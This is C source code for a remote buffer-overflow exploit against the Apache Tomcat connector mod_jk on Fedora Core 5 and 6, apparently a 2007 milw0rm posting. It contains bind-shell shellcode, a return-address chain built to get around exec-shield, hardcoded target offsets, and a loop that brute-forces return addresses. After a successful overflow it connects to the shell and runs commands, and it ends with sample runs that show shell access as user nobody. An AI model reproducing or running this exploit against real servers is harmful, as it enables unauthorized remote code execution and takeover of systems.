/*
**
** Fedora Core 5,6 (exec-shield) based
** Apache Tomcat Connector (mod_jk) remote overflow exploit
** by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/22791
** vendor: http://tomcat.apache.org/
**
** eliteboy's exploit (SUSE, Debian, FreeBSD):
** http://www.milw0rm.com/exploits/4093
**
** Nicob <nicob[at]nicob.net>'s exploit (Win32):
** http://downloads.securityfocus.com/vulnerabilities/exploits/apache_modjk_overflow.rb
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.inetcop.org
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#ifdef __linux__
#include <getopt.h>
#endif

#define MAP_URI_TO_WORKER_1_FC5 0x080474bc /* (0x2040),(0x201c) */
#define MAP_URI_TO_WORKER_1_FC6 0x080476a4 /* (0x2040),(0x201c) */
#define MAP_URI_TO_WORKER_2     0x82828282
#define MAP_URI_TO_WORKER_3     0x08048014

/* parody */
#define HOST_PARAM	"0x82-apache-mod_jk.c" /* Host */
#define DEFAULT_CMDZ	"uname -a;id;echo 'hehe, its GOBBLES style!';export TERM=vt100;exec bash -i\n"
#define PADDING_1	'A'
#define PADDING_2	'B'
#define PADDING_3	'C'
#define RET_ADDR_INC	(0x2000)
#define SH_PORT		8282

char library_shellcode[]=
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	/* linux_ia32_bind -  LPORT=8282 Size=108 Encoder=PexFnstenvSub http://metasploit.com */
	"\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0"
	"\x2c\x54\x7f\x83\xeb\xfc\xe2\xf4\xd1\xf7\x07\x3c\xb3\x46\x56\x15"
	"\x86\x74\xcd\xf6\x01\xe1\xd4\xe9\xa3\x7e\x32\x17\xc0\x76\x32\x2c"
	"\x69\xcd\x3e\x19\xb8\x7c\x05\x29\x69\xcd\x99\xff\x50\x4a\x85\x9c"
	"\x2d\xac\x06\x2d\xb6\x6f\xdd\x9e\x50\x4a\x99\xff\x73\x46\x56\x26"
	"\x50\x13\x99\xff\xa9\x55\xad\xcf\xeb\x7e\x3c\x50\xcf\x5f\x3c\x17"
	"\xcf\x4e\x3d\x11\x69\xcf\x06\x2c\x69\xcd\x99\xff";

struct {
	int num;
	char *type;
	int ret_count;
	u_long retaddr;
	u_long strcpy_plt;
	int offset;
	u_long pop_pop_pop_ret_code;
	u_long pop_pop_ret_code;
	u_long ret_code;
	u_long worker_arg1;
} targets[] = {
	{0,"Fedora Core release 5 (Bordeaux) - exec-shield\n"
	"\tApache/2.0.59 (Unix) mod_jk/1.2.19, mod_jk/1.2.20\n"
	"\ttarball install: /usr/local/apache\n"
	"\ttarball install: tomcat-connectors-1.2.xx-src.tar.gz",
	3,0x100104,0x08060c80,4112,0x08060dc4,0,0,MAP_URI_TO_WORKER_1_FC5},

	{1,"Fedora Core release 6 (Zod) - exec-shield\n"
	"\tApache/2.0.49 (Unix) mod_jk/1.2.19\n"
	"\ttarball install: /usr/local/apache\n"
	"\tbinary install: mod_jk-apache-2.0.49-linux-i686.so",
	27,0x100104,0x0805fe74,4124,0x08061489,0,0,MAP_URI_TO_WORKER_1_FC6},

	{2,"Fedora Core release 6 (Zod) - exec-shield\n"
	"\tApache/2.0.49 (Unix) mod_jk/1.2.19, mod_jk/1.2.20\n"
	"\ttarball install: /usr/local/apache\n"
	"\ttarball install: tomcat-connectors-1.2.xx-src.tar.gz",
	23,0x100104,0x0805fe74,4112,0x08061489,0,0,MAP_URI_TO_WORKER_1_FC6},

	{3,"Fedora Core release 6 (Zod) - exec-shield\n"
	"\tApache/2.0.59 (Unix) mod_jk/1.2.19, mod_jk/1.2.20\n"
	"\ttarball install: /usr/local/apache\n"
	"\ttarball install: tomcat-connectors-1.2.xx-src.tar.gz",
	3,0x100104,0x08060164,4112,0x080614d4,0,0,MAP_URI_TO_WORKER_1_FC6},
}, victim;

void re_connt(int sock);
void conn_shell(int sock,char *cmdz);
void usage(char *argv0);
void banrl();

int main(int argc,char *argv[]){
	int sock;
	int i=0,j=0,l=0,b=0;
	unsigned char do_ex[8192];
	unsigned char ex_buf[8192*2];
	unsigned char sm_buf[4];
	char *hostp=NULL,*portp=NULL,*cmdz=DEFAULT_CMDZ;

	memset(&victim,0,sizeof(victim));
	banrl();
	while((i=getopt(argc,argv,"h:t:c:r:s:p:o:m:C:"))!=-1){
		switch(i){
			case 'h':
				hostp=(char *)strtok(optarg,":");
				if((portp=(char *)strtok(NULL,":"))==NULL)
					portp="80";
				break;
			case 't':
				if(atoi(optarg)>=sizeof(targets)/sizeof(victim)){
					usage(argv[0]);
					return -1;
				}
				memcpy(&victim,&targets[atoi(optarg)],sizeof(victim));
				break;
			case 'c':
				victim.ret_count=atoi(optarg);
				break;
			case 'r':
				victim.retaddr=strtoul(optarg,NULL,16);
				break;
			case 's':
				victim.strcpy_plt=strtoul(optarg,NULL,16);
				break;
			case 'p':
				victim.pop_pop_pop_ret_code=strtoul(optarg,NULL,16);
				break;
			case 'o':
				victim.offset=atoi(optarg);
				break;
			case 'm':
				victim.worker_arg1=strtoul(optarg,NULL,16);
				break;
			case 'C':
				cmdz=optarg;
				break;
			default:
				usage(argv[0]);
				break;
		}
	}
	if(!victim.ret_count||!victim.retaddr||!victim.strcpy_plt||!victim.offset||!victim.pop_pop_pop_ret_code||!victim.worker_arg1||!hostp||!portp){
		usage(argv[0]);
		return -1;
	}

	victim.pop_pop_ret_code=victim.pop_pop_pop_ret_code+1;
	victim.ret_code=victim.pop_pop_pop_ret_code+3;

	printf("[*] os: %s\n\n",victim.type);
	printf("[*] host: %s\n",hostp);
	printf("[*] port: %s\n",portp);
	printf("[*] count: %d\n",victim.ret_count);
	printf("[*] strcpy@plt: %p\n",victim.strcpy_plt);
	printf("[*] offset: %d\n",victim.offset);
	printf("[*] pop_pop_pop_ret_code: %p\n",victim.pop_pop_pop_ret_code);
	printf("[*] pop_pop_ret_code: %p\n",victim.pop_pop_ret_code);
	printf("[*] ret_code: %p\n",victim.ret_code);
	printf("[*] map_uri_to_worker() arg1: %p\n",victim.worker_arg1);
	printf("[*] start retaddr: %p\n\n",victim.retaddr);

	putchar(';');
	srand(getpid());

	for(b=0;;victim.retaddr+=RET_ADDR_INC){

		putchar((rand()%2)? 'P':'p');
		fflush(stdout);

		usleep(100000);

		memset((char *)do_ex,0,sizeof(do_ex));
		memset((char *)ex_buf,0,sizeof(ex_buf));
		memset((char *)sm_buf,0,sizeof(sm_buf));

#define __GOGOSSING(dest,index,src){\
	*(long *)&dest[index]=src;\
	index+=4;\
}
		for(i=0;i<victim.offset-1;i++){
			sprintf(do_ex+i,"%c",PADDING_1);
		}
		__GOGOSSING(do_ex,i,victim.pop_pop_pop_ret_code);
		__GOGOSSING(do_ex,i,victim.worker_arg1); /* pop */
		__GOGOSSING(do_ex,i,MAP_URI_TO_WORKER_2); /* pop */
		__GOGOSSING(do_ex,i,MAP_URI_TO_WORKER_3); /* pop */

		for(j=0;j<victim.ret_count;j++){
			__GOGOSSING(do_ex,i,victim.ret_code);
		}

		__GOGOSSING(do_ex,i,victim.strcpy_plt); /* ret */
		__GOGOSSING(do_ex,i,victim.ret_code);
		__GOGOSSING(do_ex,i,victim.retaddr); /* library */

		sprintf(ex_buf,"GET /");
		l=strlen(ex_buf);
		for(j=0;j<i;j++){
			if((do_ex[j]>0x08)&&(do_ex[j]<0x0e)){
				memset((char *)sm_buf,0,sizeof(sm_buf));
				sprintf(sm_buf,"%02x",do_ex[j]);
				ex_buf[l++]='%';
				ex_buf[l++]=sm_buf[0];
				ex_buf[l++]=sm_buf[1];
			}
			else ex_buf[l++]=do_ex[j];
		}
		l=strlen(ex_buf);
		sprintf(ex_buf+l," HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n",library_shellcode,HOST_PARAM);
		sock=setsock(hostp,atoi(portp));
		re_connt(sock);
		send(sock,ex_buf,strlen(ex_buf),0);
		close(sock);

		sock=setsock(hostp,SH_PORT);
		if(sock!=-1){
			printf("\nTHIS IS KOREAAAAA~!: ret_count=%d, retaddr=%p, strcpy@plt=%p,\n"
				"pop3/ret=%p, worker_arg1=%p\n\n",victim.ret_count,victim.retaddr,
				victim.strcpy_plt,victim.pop_pop_pop_ret_code,victim.worker_arg1);
			conn_shell(sock,cmdz);
			exit(-1);
		}
	}
}

int setsock(char *host,int port)
{
	int sock;
	struct hostent *he;
	struct sockaddr_in x82_addr;
 
	if((he=gethostbyname(host))==NULL)
	{
		return -1;
	}
	if((sock=socket(AF_INET,SOCK_STREAM,0))==EOF)
	{
		return -1;
	}
	x82_addr.sin_family=AF_INET;
	x82_addr.sin_port=htons(port);
	x82_addr.sin_addr=*((struct in_addr *)he->h_addr);
	bzero(&(x82_addr.sin_zero),8);
 
	if(connect(sock,(struct sockaddr *)&x82_addr,sizeof(struct sockaddr))==EOF)
	{
		return -1;
	}
	return(sock);
}

void re_connt(int sock)
{
	if(sock==-1)
	{
		printf("\n[-] ");
		fflush(stdout);
		perror("connect()");
		printf("[-] exploit failed.\n");
		exit(-1);
	}
}

void conn_shell(int sock,char *cmdz)
{
	int pckt;
	char rbuf[1024];
	fd_set rset;
	memset((char *)rbuf,0,1024);
	send(sock,cmdz,strlen(cmdz),0);

	while(1)
	{
		fflush(stdout);
		FD_ZERO(&rset);
		FD_SET(sock,&rset);
		FD_SET(STDIN_FILENO,&rset);
		select(sock+1,&rset,NULL,NULL,NULL);
	
		if(FD_ISSET(sock,&rset))
		{
			pckt=read(sock,rbuf,1024);
			if(pckt<=0)
			{
				exit(0);
			}
			rbuf[pckt]=0;
			printf("%s",rbuf);
		}
		if(FD_ISSET(STDIN_FILENO,&rset))
		{
			pckt=read(STDIN_FILENO,rbuf,1024);
			if(pckt>0)
			{
				rbuf[pckt]=0;
				write(sock,rbuf,pckt);
			}
		}
	}
	return;
}

void usage(char *argv0){
	int i;

	printf("Usage: %s <-switches> -h host[:80]\n",argv0);
	printf("  -h host[:port]\tHost\n");
	printf("  -t number\t\tTarget id.\n");
	printf("  -c ret_count\t\tret count\n");
	printf("  -r retaddr\t\tstart library retaddr\n");
	printf("  -s strcpy@plt\t\tstrcpy plt address\n");
	printf("  -p pop3/ret\t\tpop3/ret address\n");
	printf("  -o offset\t\tOffset\n");
	printf("  -m worker_arg1\tmap_uri_to_worker() arg1\n");
	printf("  -C cmdz\t\tCommands\n");
	printf("\nExample: %s -t 0 -h apache_tomcat.target.kr\n",argv0);
	printf("\n--- --- - Potential targets list - --- ---- ------- ------------\n");
	printf(" ID / Return addr / Target specification\n");
	for(i=0;i<sizeof(targets)/sizeof(victim);i++)
		printf("% 3d / 0x%08x /\n\t%s\n\n",i,targets[i].retaddr,targets[i].type);
	exit(-1);
}

void banrl(){
	printf("INetCop(c) Security\t\t\t\t\t%s\n\n",HOST_PARAM);
}

/*
**
** Fedora core 5 exploit:
** --
** $ ./0x82-apache-mod_jk -t 0 -h fc5.inetcop.org
** INetCop(c) Security                                     0x82-apache-mod_jk.c
** 
** [*] os: Fedora Core release 5 (Bordeaux) - exec-shield
**         Apache/2.0.59 (Unix) mod_jk/1.2.19, mod_jk/1.2.20
**         tarball install: /usr/local/apache
**         tarball install: tomcat-connectors-1.2.xx-src.tar.gz
** 
** [*] host: fc5.inetcop.org
** [*] port: 80
** [*] count: 3
** [*] strcpy@plt: 0x8060c80
** [*] offset: 4112
** [*] pop_pop_pop_ret_code: 0x8060dc4
** [*] pop_pop_ret_code: 0x8060dc5
** [*] ret_code: 0x8060dc7
** [*] map_uri_to_worker() arg1: 0x80474bc
** [*] start retaddr: 0x100104
** 
** ;PPPpppPpppPpppPPpPpPPPppPppPPppPPpPPpPPPPPP
** THIS IS KOREAAAAA~!: ret_count=3, retaddr=0x154104, strcpy@plt=0x8060c80,
** pop3/ret=0x8060dc4, worker_arg1=0x80474bc
** 
** Linux localhost 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux
** uid=99(nobody) gid=4294967295 groups=4294967295
** hehe, its GOBBLES style!
** bash: no job control in this shell
** bash-3.1$
** --
**
** Fedora core 6 exploit:
** --
** $ ./0x82-apache-mod_jk -t 3 -h fc6.inetcop.org
** INetCop(c) Security                                     0x82-apache-mod_jk.c
** 
** [*] os: Fedora Core release 6 (Zod) - exec-shield
**         Apache/2.0.59 (Unix) mod_jk/1.2.19, mod_jk/1.2.20
**         tarball install: /usr/local/apache
**         tarball install: tomcat-connectors-1.2.xx-src.tar.gz
** 
** [*] host: fc6.inetcop.org
** [*] port: 80
** [*] count: 3
** [*] strcpy@plt: 0x8060164
** [*] offset: 4112
** [*] pop_pop_pop_ret_code: 0x80614d4
** [*] pop_pop_ret_code: 0x80614d5
** [*] ret_code: 0x80614d7
** [*] map_uri_to_worker() arg1: 0x80476a4
** [*] start retaddr: 0x100104
** 
** ;pPpPppppPpppPppPPPpPPpPppPpPpPPpPPPPPpP
** THIS IS KOREAAAAA~!: ret_count=3, retaddr=0x14c104, strcpy@plt=0x8060164,
** pop3/ret=0x80614d4, worker_arg1=0x80476a4
** 
** Linux localhost 2.6.18-1.2798.fc6 #1 SMP Mon Oct 16 14:54:20 EDT 2006 i686 i686 i386 GNU/Linux
** uid=99(nobody) gid=4294967295 groups=4294967295
** hehe, its GOBBLES style!
** bash: no job control in this shell
** bash-3.1$
** --
**
*/

/* eox */

// milw0rm.com [2007-07-08]
